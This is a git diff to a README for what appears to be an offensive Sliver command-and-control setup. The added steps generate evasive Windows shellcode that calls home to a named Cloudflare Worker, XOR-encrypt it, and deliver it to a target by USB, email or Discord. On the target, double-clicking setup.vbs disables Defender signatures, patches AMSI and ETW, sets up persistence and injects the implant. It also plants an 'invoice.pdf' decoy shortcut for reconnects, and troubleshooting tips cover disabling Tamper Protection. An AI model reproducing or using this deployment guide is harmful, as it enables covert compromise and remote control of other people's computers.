@@ -64,7 +64,43 @@ setup.vbs + loader.exe + UnDefend.exe + sliver.bin
 
 **Double-click `setup.vbs`** → one click, everything fires.
 
-### 3. Interact
+### 3. Generate Implant (sliver.bin)
+
+`c2-start.sh` generates this automatically. If you need to rebuild manually:
+
+```bash
+# Inside sliver console:
+http --lhost 127.0.0.1 --lport 8080
+generate --os windows --http sliver-c2.pantha704.workers.dev:443 \
+  -f shellcode -s /tmp/sc.bin \
+  --shellcode-entropy 3 --shellcode-compress --shellcode-bypass 2 \
+  --skip-symbols --shellcode-encoder xor
+
+# Then XOR encrypt:
+python3 -c "KEY=0xAA; sc=open('/tmp/sc.bin','rb').read(); open('sliver.bin','wb').write(bytes(b^KEY for b in sc))"
+```
+
+### 4. Transfer to Target
+
+Copy these 4 files to `C:\Users\<username>\Downloads\` on the Windows target:
+
+```
+setup.vbs + loader.exe + UnDefend.exe + sliver.bin
+```
+
+Any transfer method works: USB, cloud drive, email, Discord, HTTP download.
+
+### 5. Deploy on Target
+
+**Double-click `setup.vbs`** in the Downloads folder. This is the only manual action.
+
+What happens automatically:
+- UnDefend.exe runs hidden → locks Defender signature files
+- loader.exe runs hidden → unhook + AMSI + ETW + persist + inject
+- Desktop shortcut `invoice.pdf` appears (PDF icon) for future reconnects
+- Implant calls home via HTTPS to Worker
+
+### 6. Interact
 
 ```bash
 sliver                    # Open console
@@ -178,6 +214,46 @@ zig c++ -target x86_64-windows-gnu -o UnDefend.exe src/UnDefend.cpp \
 - [Cloudflare Tunnel](https://www.cloudflare.com/products/tunnel/) - Free tunnel
 - [Zig](https://ziglang.org/) - Cross-compiler used for Windows binaries
 - [Donut](https://github.com/TheWover/donut) - PE to shellcode converter (used by Sliver)
+
+## Alias (optional)
+
+Add to `~/.bashrc` for quick C2 startup:
+
+```bash
+alias c2up='bash /path/to/sliver-c2/server/c2-start.sh'
+```
+
+Then just type `c2up` in a terminal to restart the entire C2 pipeline.
+
+## Checking if Implant Connected
+
+```bash
+# Method 1: Sliver console
+sliver
+>> sessions        # Shows all connected implants with ID, hostname, IP
+
+# Method 2: Check Worker response
+curl -s -o /dev/null -w "%{http_code}" https://sliver-c2.pantha704.workers.dev
+# 404 = tunnel + sliver alive
+# 503 = tunnel/sliver down
+# 530 = worker misconfigured
+
+# Method 3: Check Sliver listener
+ss -tlnp | grep 8080    # Should show Sliver listening
+```
+
+## Troubleshooting
+
+| Problem | Fix |
+|---|---|
+| Worker returns 530 | Tunnel dead or Worker not deployed. Run `c2up`. |
+| Implant doesn't connect | Check Windows Defender didn't block it. Check target has internet. |
+| `UnDefend.exe` fails | Tamper Protection might block it. Disable in Defender settings. |
+| `loader.exe` crashes | `sliver.bin` not in same folder or corrupted. Re-copy both. |
+| No session appears | Check Ubuntu firewall: `sudo ufw allow 8080`. Check tunnel log: `tail c2-tunnel.log`. |
+| Worker URL 404 but no session | Implant might not have run yet. Check Windows target. |
+| Tunnel URL expired | Run `c2up` to refresh. Worker auto-updates. |
+| `c2up` fails | Check `CF_API_TOKEN` env var is set. Check internet connectivity. |
 
 ## License
 
